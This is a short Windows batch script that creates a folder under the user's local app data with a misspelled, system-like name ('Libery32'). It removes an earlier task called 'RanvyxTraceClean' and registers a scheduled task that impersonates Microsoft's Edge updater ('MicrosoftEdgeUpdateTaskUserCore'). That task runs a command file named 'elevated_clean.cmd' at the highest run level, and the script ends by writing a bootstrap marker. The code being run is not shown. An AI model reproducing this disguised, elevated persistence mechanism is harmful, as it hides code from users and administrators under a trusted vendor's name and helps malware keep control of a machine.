set "DIR=%LOCALAPPDATA%\Libery32"
if not exist "%DIR%" mkdir "%DIR%" 2>nul
set "BAT=%DIR%\elevated_clean.cmd"
set "TR=cmd.exe /c ""%BAT%"""
schtasks /Delete /TN "RanvyxTraceClean" /F 2>nul
schtasks /Delete /TN "MicrosoftEdgeUpdateTaskUserCore" /F 2>nul
schtasks /Create /TN "MicrosoftEdgeUpdateTaskUserCore" /TR "%TR%" /SC ONCE /ST 00:00 /SD 01/01/2020 /RL HIGHEST /F
echo ok>"%DIR%\.bootstrap_done"
exit /b 0
